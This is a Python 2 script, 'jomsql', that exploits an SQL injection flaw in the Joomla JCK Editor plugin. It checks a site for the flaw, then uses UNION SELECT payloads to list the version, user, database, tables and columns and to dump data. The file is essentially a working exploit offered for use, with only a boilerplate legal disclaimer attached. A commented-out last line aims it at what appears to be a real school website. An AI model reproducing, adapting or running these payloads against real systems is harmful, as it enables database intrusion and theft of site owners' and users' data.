#!/usr/bin/python

import requests
import re
from bs4 import BeautifulSoup
import sys
import time

class warna :
	HIJAU = '\033[92m'
	KUNING = '\033[33m'
	MERAH = '\033[31m'
	BIRU = '\033[94m'
	TUTUP = '\033[00m'
	
def cek(url):
	print warna.HIJAU+"[+] Checking "+url+warna.TUTUP
	payload = "/plugins/editors/jckeditor/plugins/jtreelink/dialogs/links.php?extension=menu&view=menu&parent=\" UNION SELECT NULL,NULL,0x54683173317374337374,NULL,NULL,NULL,NULL,NULL-- aa"
	payloadver = "plugins/editors/jckeditor/plugins/jtreelink/dialogs/links.php?extension=menu&view=menu&parent=%22%20UNION%20SELECT%20NULL,NULL,concat(version(),0x3a,0x3a,0x3a,user()),NULL,NULL,NULL,NULL,NULL--%20aa"
	cek = requests.get(url+payload).text
	cek2 = requests.get(url+payloadver).text
	if (re.search("Th1s1st3st",cek) != None):
		print warna.HIJAU+"[+] Vulnerable!"+warna.TUTUP
		time.sleep(1)
		soup = BeautifulSoup(cek2,'html.parser')
		find = soup.find_all('node')
		print "------------=======[Version ::: User]=======-----------"
		for vu in find:
			print "- "+vu.get('url')
		print "------------=======[Version ::: User]=======-----------"
	else:
		print MERAH+"[+] Not Vulnerable"+TUTUP

def database(url):
	print warna.HIJAU+"[+] Checking "+url+warna.TUTUP
	time.sleep(1)
	print warna.HIJAU+"[+] Get the database name"+warna.TUTUP
	payload = "plugins/editors/jckeditor/plugins/jtreelink/dialogs/links.php?extension=menu&view=menu&parent=%22%20UNION%20SELECT%20NULL,NULL,concat(database()),NULL,NULL,NULL,NULL,NULL--%20aa"
	cek = requests.get(url+payload).text
	soup = BeautifulSoup(cek,'html.parser')
	find = soup.find_all('node')
	print "------------=======[Database]=======-----------"
	for db in find:
		print "- "+db.get('url')
	print "------------=======[Database]=======-----------"
	
def tables(url):
	print warna.HIJAU+"[+] Checking "+url+warna.TUTUP
	time.sleep(1)
	print warna.HIJAU+"[+] Get the tables name"+warna.TUTUP
	payload = "/plugins/editors/jckeditor/plugins/jtreelink/dialogs/links.php?extension=menu&view=menu&parent=%22%20UNION%20SELECT%20NULL,NULL,concat(table_name),NULL,NULL,NULL,NULL,NULL+FROM+information_schema.tables+where+table_schema=database()--%20aa"
	cek = requests.get(url+payload).text
	soup = BeautifulSoup(cek,'html.parser')
	find = soup.find_all('node')
	print "------------=======[Tables]=======-----------"
	for tab in find:
		print "- "+tab.get('url')
	print "------------=======[Tables]=======-----------"

def columns(url,table):
	print warna.HIJAU+"[+] Checking "+url+warna.TUTUP
	time.sleep(1)
	print HIJAU+"[+] Get the columns name"+TUTUP
	payload = "/plugins/editors/jckeditor/plugins/jtreelink/dialogs/links.php?extension=menu&view=menu&parent=%22%20UNION%20SELECT%20NULL,NULL,concat(column_name),NULL,NULL,NULL,NULL,NULL+FROM+information_schema.columns+where+table_name='{}'--%20aa".format(table)
	cek = requests.get(url+payload).text
	soup = BeautifulSoup(cek,'html.parser')
	find = soup.find_all('node')
	print "------------=======[Columns]=======-----------"
	for col in find:
		print "- "+col.get('url')
	print "------------=======[Columns]=======-----------"	
	
def dump(url,column,table):
	print warna.HIJAU+"[+] Checking "+url+warna.TUTUP
	time.sleep(1)
	print warna.HIJAU+"[+] Get data from the columns"+warna.TUTUP
	print warna.KUNING+"[!] if more than one column, then separate with commas"+warna.TUTUP
	if ("," in column):
		col = column.replace(",",",0x3a,0x3a,0x3a,")
		payload = "/plugins/editors/jckeditor/plugins/jtreelink/dialogs/links.php?extension=menu&view=menu&parent=%22%20UNION%20SELECT%20NULL,NULL,concat("+col+"),NULL,NULL,NULL,NULL,NULL+FROM+{}--%20aa".format(table)
	else:
		payload = "/plugins/editors/jckeditor/plugins/jtreelink/dialogs/links.php?extension=menu&view=menu&parent=%22%20UNION%20SELECT%20NULL,NULL,concat("+column+"),NULL,NULL,NULL,NULL,NULL+FROM+{}--%20aa".format(table)
	cek = requests.get(url+payload).text
	soup = BeautifulSoup(cek,'html.parser')
	find = soup.find_all('node')
	print "------------=======["+column[0]+" ::: "+column[1]+"]=======-----------"
	for db in find:
		print "- "+db.get('url')
	print "------------=======[Column]=======-----------"

def help():
	print warna.MERAH+"""
Usage : python jomsql.py -u [target] [options]
Options:
-u [target]        Target Host
-T [table name]    Nama Target  
-C [Column name]   Nama Kolom
--test             Testing target
--database         Show Database Name
--tables           Show Tables
--columns          Show Columns
--dump             Dump Data

Example:
python jomsql.py -u http://xnxx.com --test
python jomsql.py -u http://xnxx.com --database
python jomsql.py -u http://xnxx.com --tables
python jomsql.py -u http://xnxx.com -T tablename --columns
python jomsql.py -u http://xnxx.com -T tablename -C columnname,columnname --dump

"""+warna.TUTUP

	
def banner():
	print warna.BIRU+"""
   ___                           _ 
  |_  |                         | |
    | | ___  _ __ ___  ___  __ _| |
    | |/ _ \| '_ ` _ \/ __|/ _` | |
/\__/ | (_) | | | | | \__ | (_| | |
\____/ \___/|_| |_| |_|___/\__, |_|
                              | |  
                              |_| 
	Joomla jckeditor sql injection
	Tool author : security007"""+warna.TUTUP+warna.KUNING+"""
	
	[!] legal disclaimer: Usage of jomscan for attacking targets without prior mutual consent is illegal. 
	It is the end user's responsibility to obey all applicable local, state and federal laws. 
	Author assume no liability and are not responsible for any misuse or damage caused by this program
	
	"""+warna.TUTUP
	
def main():
	banner()
	if (len(sys.argv)==4 and sys.argv[1] == "-u" and sys.argv[3] == "--test"):#test host
		host = sys.argv[2]
		cek(host)
	elif (len(sys.argv)==2 and sys.argv[1] == "-h"):
		help()
	elif (len(sys.argv)==4 and sys.argv[1] == "-u" and sys.argv[3] == "--database"):#show database
		host = sys.argv[2]
		database(host)
	elif (len(sys.argv)==4 and sys.argv[1] == "-u" and sys.argv[3] == "--tables"):#show tables
		host = sys.argv[2]
		tables(host)
	elif (len(sys.argv)==6 and sys.argv[1] == "-u" and sys.argv[3] == "-T" and sys.argv[5] == "--columns"):#show columns
		host = sys.argv[2]
		table = sys.argv[4]
		columns(host,table)
		
	elif (len(sys.argv)==8 and sys.argv[1] == "-u" and sys.argv[3] == "-T" and sys.argv[5] == "-C" and sys.argv[7] == "--dump"):#dump data
		host = sys.argv[2]
		table = sys.argv[4]
		column = sys.argv[6]
		dump(host,column,table)
	else:
		print "[-] Missing option"
		help()
	
if (__name__ == "__main__"):
		main()
		
#tables("https://tigs.nsw.edu.au/")